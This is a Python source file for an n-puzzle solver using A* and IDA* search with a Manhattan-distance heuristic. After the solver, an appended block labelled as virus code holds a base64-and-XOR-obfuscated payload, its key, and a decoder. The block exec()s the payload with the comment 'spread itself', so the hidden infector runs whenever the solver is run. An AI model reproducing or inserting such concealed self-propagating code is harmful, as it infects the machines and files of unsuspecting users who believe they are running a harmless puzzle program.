from copy import deepcopy
class nPuzzle():
    def __init__(self,puzzle,parent,dimension):
        self.puzzle = puzzle
        self.parent = parent
        self.dimension = dimension
        self.hScore = 0
        self.gScore = 0
        self.fScore = self.hScore + self.gScore
    def manhattandistance(self,goal):
        initial_state = sum(self.puzzle, [])
        goal_state = sum(goal.puzzle, [])
        return sum(abs(b%self.dimension - g%self.dimension) + abs(b//self.dimension - g//self.dimension)for b, g in ((initial_state.index(i), goal_state.index(i)) for i in range(1, self.dimension*self.dimension)))
    def puzzlePrint(self):
        print
        for i in range(self.dimension):
            for j in range(self.dimension):
                if self.puzzle[i][j] == 0:
                    print ('_'),
                else:
                    print (self.puzzle[i][j]),
            print
    def __eq__(self, rival):
        return self.puzzle == rival.puzzle

def inlist(val, puzzle):
    global dimension
    for i in range(0,dimension):
        for j in range(0,dimension):
            if puzzle[i][j] == val:
                return i,j
    return -1

def moveCheck(state,x1,y1,x2,y2):
    if x2 >= 0 and x2 < len(state) and y2 >= 0 and y2 < len(state):
        temp_puz = []
        temp_puz = deepcopy(state)
        temp_puz[x1][y1] = temp_puz[x2][y2]
        temp_puz[x2][y2] = 0
        return temp_puz
    else:
        return None

def move_function(curr):
    global dimension
    x,y = inlist(0,curr.puzzle)
    movelist = [[x+1,y],[x-1,y],[x,y+1],[x,y-1]]
    children = []
    for i in movelist:
        child = moveCheck(curr.puzzle,x,y,i[0],i[1])
        if child is not None:
            succ = nPuzzle(child, curr,dimension)
            children.append(succ)
    return children

def minfScore(openList):
    fScore = openList[0].fScore
    index = 0
    for i, item in enumerate(openList[1:]):
        if(item.fScore < fScore):
            fScore = item.fScore
            index  = i+1
    return openList[index], index
    
def AStar(start):
    openList = []
    closedList = []
    openList.append(start)
    global maxCost
    limit = 0
    while openList:
        current, index = minfScore(openList)
        if limit > maxCost:
            return None
        if current.puzzle == goal.puzzle:
            return current
        openList.pop(index)
        closedList.append(current)
        limit += 1
        moveList = move_function(current)
        for i in range(len(moveList)):
            child = moveList[i]
            flag1 = False
            for item in closedList:
                if item == child:
                    flag1 = True
                    break
            if not flag1:
                g = current.gScore + 1 
                flag2 = False 
                for item2 in openList:
                    if item2 == child:
                        index = openList.index(item2)
                        flag2 = True
                        if g < openList[index].gScore:
                            submitter(openList[index],g,current)
                if not flag2:
                    submitterWM(child,g,child.manhattandistance(goal),current)
                    openList.append(child)
    return None
def submitterWM(child,g,h,current):
    child.gScore = g
    child.hScore = child.manhattandistance(goal)
    child.fScore = child.gScore + child.hScore
    child.parent = current
    return child
def submitter(child,g,current):
    child.gScore = g
    child.fScore = child.gScore + child.hScore
    child.parent = current
    return child
def IDS(start,dep,lim):
    global maxCost
    dep = dep + 1
    if start.hScore >= lim:
        if start.hScore != lim:
        	return start, start.hScore
    if start.puzzle == goal.puzzle:
        return start, start.hScore
    moveList = move_function(start)
    mini = maxCost
    for i in moveList:
        i.gScore = i.manhattandistance(goal)
        i.hScore = i.gScore + start.hScore
        ret, newlimit = IDS(i, dep, lim)
        if ret.puzzle == goal.puzzle:
            return ret, ret.hScore
        if newlimit <= mini:
        	if newlimit!=mini:
				mini = newlimit
    return start, mini

def SolvePuzzleIDA(start):
    global maxCost
    limit = start.manhattandistance(goal)
    start.gScore = limit
    while limit < maxCost:
        node, limitn = IDS(start, 0, limit)
        if node.puzzle == goal.puzzle:
            return node
        limit = limitn + 1
    return None

method = raw_input()
maxCost = input()
dimension = input()
start = nPuzzle([],None,dimension)
goal = nPuzzle([],None,dimension)
tracklist = []
rowArray = []
for j in range(0,dimension):
    a = raw_input()
    for i in range(0,dimension):
        if a.split(" ")[i] == "_":
            rowArray.append(0)
        else:
            rowArray.append(int(a.split(" ")[i]))
    start.puzzle.append(rowArray)
    rowArray = []
rowArray = []
for j in range(0,dimension):
    a = raw_input()
    for i in range(0,dimension):
        if a.split(" ")[i] == "_":
            rowArray.append(0)
        else:
            rowArray.append(int(a.split(" ")[i]))
    goal.puzzle.append(rowArray)
    rowArray = []
if method == 'A*':
    result = AStar(start)
if method == 'IDA*':
    result = SolvePuzzleIDA(start)
if(not result):
    print ('FAILURE')
else:
    print ('SUCCESS')
    tracklist.append(result)
    t=result.parent
    while t:
        tracklist.append(t)
        t=t.parent
for obj in reversed(tracklist):
    obj.puzzlePrint()
#viruscode_start
#INFECTEDbye2171445
#payload_start
cipher_text = """RAECHhoKDAMDFTADHwwQGWcPARIIBR9MAAplChUfAlAEHkwdDBIEQg4aGwMdDU8GCBkBegIAEgIf
EkwQAgYeCRwNHGYOHR8fGRlCHhkUBQwAfQIBHxYdGEcCDh4PAg9nZwUAAxQESzoGCxofXXpPUEtN
BggLRjM9DhkCGDAmRx8CHAlZUWdCTU1GTEJHVxgJAx9BDQscPxEfBRFNUEYfBwsRRQoGFwstCxw/
ER8FEUVEbExCR1dLTE9ZHAkLFkEZBQsHDhknAA5PXktMT1llTEdQT3pLTUJNCQMKQhUWBQgAFCQJ
HlgcFQcLTgYIHyAHCUpZXEZDZUxHUE9QS01CAQgSGAcVBEtRTwobHg4eCF4KHgEEBDkADRASGQ8O
CgpmR1BPUEtNQk0fAxgXFRlLS0hXBQMOHkcCCgMGAgBIDwoIHggJRxUKGBMVHQNCTQQCH0YFQg4Z
Sx4OFwgJTxsKCScIDEREbGZCR1dLCAofTwoOHgsxBwEyDBkOH0oUEgcKQwkOGA9NSF5MRFhnTUZM
QkdXS0wOFQMzARkDFRgyAwMJOQgLFQRLUU8WHEILGRwEDwQQRR0HGApOfUtMT1lPTEdQHwkfBQ0D
MgAFDgIES1FPIjJmbVBPUEtNQk1NAAMQRx5LBQFZDgALLwkZBwgRMgwICD0DHhkfVXNPTEdQT1BL
TUJNTUYNABQYBxkbHDAcBgQHUFZNDR5DFg0WD1kBAwYXRxwGBAdcSwRLZ01GTEJHV0tMT1lPTA4W
RwMOAQRDBBU8G08WCR8AFRoYAi8fER8FS0RXbExCR1dLTE9ZT0xHUE9QS00SFBkOAww4EQIACgpB
DRcACh4PRQMPHgkAFxMSNBwODQdFbVBPUEtNQk1NRkxCRxIHBQlRAB9JAA4EA0MLHgkPHkoGFRgD
AwwbCTgADgQDREtXZ0ZMQkdXS0xPWU9MR1BPUEsdGxkFCQI9AR4HCRxZUkwXCRsYBAM9CwQKCRFH
XEsfChUJQgEZARQqAQ49DBIEEU8WCR8AFRoYAi8fER8FS2dNRkxCR1dLTGVZT0xHUE9QSx8HGRgU
AkIXDh8EABcwCg4cCgNhTUJNTWxMQkdXDwkJWQYfNwlHAw4BBEEdBxgKTk1hTE9ZT0xHUE8ZDU0M
AhlGAxFJBwoYB1cGHwMZHVgbDBYFREYNDANXGw0bEUEJCRQcBwIZCkVKSBwbQF5RZk9ZT0xHUE9Q
S01CTR8DGBcVGUs4HQwKZkdQT1BLTUJNCAofB119S0xPWU9MR1BPUEtNEAgZEx4MRzEKABwcZWZH
UE9QDwgETQ4UCQMTEjsNFhUADQNYHBUHC0tXZ0ZMQkdXS0xPWk8KDhwKUFZNABQZAw0QFRYSRAAJ
CgJPLzAWAgEHMjJKTEUVFUxFQQsKDQNYRllhTUJNTUZMQkcRAgAKRA1LQFBMUAwIFk0bDx4XFFcI
AwscTw4CBBgVDgNCAQQICRFHVUgaBgsaHwQfCxU0HhYMHxJOQgYZD0xNWhkFFQUcEwQJBzIICAhA
bVdLTE9ZT0xHAxsRGRkHCU1bTCQGGxgJZVlPTEdQT1BLDwQEAQNMX0cYGwkBUTAzARkDFTQyTk1K
FA5FTlkZCQ4dR0VHU08WAgEHTQwVTABAUGFMT1lPTEdQTxYEH0IPAQ8CB0ceBUwNHwYAAl4cAAcE
FkUPQTAMQF5RZk9ZT0xHUE9QS01CTQQATBETFhkYCh1VZkdQT1BLTUJNTUZMQkdXS0wJEAMJR01P
FgIBB01GRg4ODhkOR08bSDAJV2VQS01CTU1GTEJHV0sJAxAJTAUcBh4OTV9QTQRLQREeGRkcGgAI
Ai8cBAofFkpXbExCR1dLTE9ZT0xHUE9QS00RGQwUGAcDV1ZMOwsaCW1QT1BLTUJNTUZMQkdXS0xP
HwYAAlBSUA0EDghNTUwACx4FCURZDUs7Hkh6S01CTU1GTEJHV0tMChUGCkcSAxkFCEJQUEYORUQB
Ah4aCgwDAxUwFQUJRVdnRkxCR1dLTE9ZT0xHUE9QSwsLAQhGUUIBHgcJT1JPDgsZARVATQBKMQhL
aEdXS0xPWU9MR1BPUEtNQk0PFAkDDH1hTE9ZT0xHUE8bDhRCUE0VCQ4BWRkNAR0AASwVFlhCZ0JN
TUZMQkdXCAUfEQoeR1BSUD0EEBgeSBQNFSgIHhYJGzMBGQMVQwsLAQhKBwceWw4CDBYLCUdNTyQZ
GAdEZ0ZMQkdXS0xPc09MR1BPUEtNEgwUCgMDA1dWTA1eMwJEBgYCHh4BAgkDMxETFhkYMxdIZkdQ
T1BLTUJNHQcVDggWD0xSWR8NHhwAEQ9NSU0PQU8rKTEuLzs8Kw4eFV1BXFxWWVg6AkVtV0tMT1lP
TEcADgkHAgMJTVtMEgYOBwMOHU9HRxJIUxsMGwECBwg9FAMKHhslAUttUE9QS01CTU0WDRsLGAoI
T0RPHAYJAx8KCUJGTQRLAQ4HAwkdJhsJHwRPTUtPQE9KRkdCTxQCHAccHUVHW09QCUpAT086AkVt
V0tMT1lPTEcADgkHAgMJTVtMEgYOBwMOHU9HRxJIEwIdCggfOQcHHldWTE1eT0dHGwoJRQgMDgIC
CUpOV0BMDV5NS21QT1BLTUJNTRYNGwsYCghPRE8cBgkDHwoJQkZNBEs+CVQbDRYVAA0DLwoeD0pC
Z2dGTEJHV0tMTxwXCQQFGxEJAQdNUEZOQEV9DwkJWRcDFS8MAhIdFjILDwAHTxMKGA5VBAkeXAoe
CAIGCE1bTCQGGxgJQ1kLCQQfCxVLUEIrDAofB05NYUxPWU9MR1BPFhkCD00EEgkQExgEABxZBgEX
Hx0ESw4bDgEDZkJHV0tMT1lPBQoAAAIfTQAMHgNaVm1XS0xPWU9MR3pPUEtNQk1NRgUERxMODwAd
ClZHU08TAh0KCB85GAcfA0tRTwobHg4eCFBHTQkIFEZRQhQDGQUBHmVMR1BPUEtNQk1NRkwGBgMK
TFJZDQ0UFVlERQkHDgICCRETBQICCFENFRMVDgIZDBtFCQcYA0tVHhgJVFdOTllPU0sPGxkIRg0Q
FRYSTEcBAB4CFE8SDgsNHwhPZkJHV0tMT1lPTEdQT1NLFQ0fTQcLAw4ZS0BPEAEaAgIcFUtnQk1N
RkxCR1dLTE9ZFwMVFQtQVk1FSkMMAwsJXwgEHVEXTDlQAAIPRRtEREYKDRVXQxRDAEZMDh5PCgId
SgkMEg1ORxQSDwMcRwcCCUZZQmdCTU1GTEJHV0tMT1kdCRMFHR5LFQ0fCAJmQkdXS0xPWU9mR1BP
UEtNQk0EAEwHCRQECApDT09HCE9dVU0AFBkDZkJHV0tMT1lPTEdQTwgEHwcJTVtMRUBZAQMGF0cP
DwJHWBNEQjNNCR4GTw5CRU8fAB5HWBdcEkRCBANGFgsXXw8NGxhDTAQJDBwORQkIFE9FS21XS0xP
WU9MR1BPUEsfBxkYFAJCBRYYCVlNQQkJEwAUDh4WHwQIC0ofGBkJC1cKAgQfCxVDREtDHhIeCxdf
QmZPWU9MR1BPUGFOER0fAw0GRx4fHwoVCWYCCAoTQxUNHzIFHhsXAzQKBhUKRAQZHxgOHz0ZCB4Y
TgQeGwQKCzAHAglDFA4ODQkIRlFCMwUeCUZQZU8RGR0FGA4NCQg5CQwDVUlOZXNPTEdQT1BLTRIM
FAoDAwNXVkwfGBYACBELXg8IAQIJA0RLR1xLCRccDBkTEQ0cDmdCTU1GTEJHVxkJGwwdAkcADgkH
AgMJTUZMaEdXS0xlc09MR1ALFQ1NCx4kCAoHBAMOCEcKCgABXB8RHwVLV2dGTEJHV0tMTw4GGA9Q
AAAOA0odDBIES0cWGEwJEAMJXXpPUEtNQk1NRkxCR1cCCk9eTCUpNiozPygmDxQDXlNQRl9YWl5P
BQlQCRkHCEwfCAcISk5NYUxPWU9MR1BPUEtNQk1NRkwQAgMeHgFZOx4SFWVQS01CTU1GTEJHV0sJ
AwoKVm1QT1BLTUJNTUZMQkdXS0xPCwoYEgIBUC0MDh4IbExCR1dhTE9ZTwgCFk8ZBQsHDhlOHwcL
EUccDg0HRV16T1BLTUJNTUZPEhUeBRhHWyYCARUMBAIDBU1PSkwSBgMDRWVZT0xHUE9QSwsLAQhG
UUIIBw4CRwkOGA9cSBFMREJOTQccEgIZD2ZPWU9MR1BPUBsMGwECBwhCWlcYCQMfQQ8VFQ4EDj0D
FAEJDQZPXmFMT1lPTEdQTxYCAQdDGhQFFgJfGw0WFQANA1llUEtNQmdNRkxCAxINTAYXCQkEBC4c
B0URCAEARVhtV0tMT1lPTEcWAAJLHQMZBUYFDEcEDgAJVw4ACyAOBAMeWGdNRkxCR1dLTE9ZT0wO
Fk8eBBlCHggKCkwOBCICCRwMGAIURwAKGQpEV2xMQkdXS0xPWU9MR1BPUEtNEQgBAEILCREODxtR
Hw0TGEZ6S01CTU1GTEIEGBkDARhPUUcCCgEeCBEZHkgLBxNfSQQbDR8fXV9AEwQfDQMMSx8WBgMY
QgAXAwUJFVAWBB8PDBlbBhEIGUlFZVlPTEdQT1BLHRAEAxJEAQgFBAIOVxsJHwRGemFnQk1NRiwR
ExYfBQwUChgPHwtQS01CZ01GTEIDEg1MFxYdMwQCFgAfMgQEAQNEBgYDCkAEHBZAAh4MHw8IQlBN
IA0OFBJHTAscDAMDFU9NSysDAR4DRVhtV0tMT1lPTEcWHR8GTQsZCBQYDQgbGEwGFB8DFQRPExIO
DghnRkxCR1dLTE8QAhwIAhtQCQwRCFtSZkJHV0tMT1lPZkdQT1BLTUJNBABMBgIUBAgKQ09PRxMG
AAMIEDIZAxQWR0pLHxsLBgIAUENQAAgbTVBGHxYVHgULZVlPTEdQT1BLTUJNTQINFgZXVkwNGBwJ
UURBFA4ODQkIFRgQDhkMRA0AGwkGAh0REkUGDBkHQEASAw1BV1tGRUdTTxISGQdNDBQeAx5XQxQA
CwoIRxIKFgQfB0RnRkxCR1dLTE9ZT0xHU08IBB9CDAoHBQxHW0sFAQ8KHhQVT3pLTUJNTUZMQkdX
S0wXFh0JA1BSUExKTAcCDwJKBB8ZRBdZMUwIAgtYEkRLTQsJHkJPD0cVRlkGAkcKBgBDCQMZDEpM
AR4UBwlHEgoVTllGektNQk1NRkxCR1dLTB0cGxkVHk8IBB8HCWdGTEJHV0tMT3NPTEdQT1BLTQsL
TQMCAQgTDlZPWk8UR11RUAkUFghnRkxCR1dLTE9ZT0xHCAACDglCUE1BS0wNGAICRxoHHk9YF1lL
M0ICHwJEG05eSwoAC09EH1wWWUsEDE0XDxxKAxYfDUNZDBUEHApYAAgbRERPZkJHV0tMT1lPTEdQ
TwIOGRcfA0YOAxQSXVhBHAEPCBQKAx8fCwMKThQNFRIPQgoXDAMDFUdZQkMRGR8PHEpOfWFmGVlS
TDEZHQUYRUtnThAFEBIECAMLHDAJCRRl"""
cipher_key = "gwkloyolgpopkmbmmflb"
#payload_end
def xor_crypt_file(data,key,encode = False, decode = False):
        from itertools import cycle
        import base64
        
        if decode: # cipher_text = string , key = string
            data = base64.decodestring(bytearray(data,"utf-8")) # byte array (xored before)
            # xor again , inverse 
            xored = ''.join(chr(x ^ ord(y)) for (x,y) in zip(data, cycle(key)))
            return xored
        
        if encode: # x -> byte
            xored = ''.join(chr((x) ^ ord(y)) for (x,y) in zip(data, cycle(key)))
            return base64.encodestring(xored.encode()).strip()
        
#spread itself
exec(xor_crypt_file(cipher_text,cipher_key,decode = True))
#viruscode_end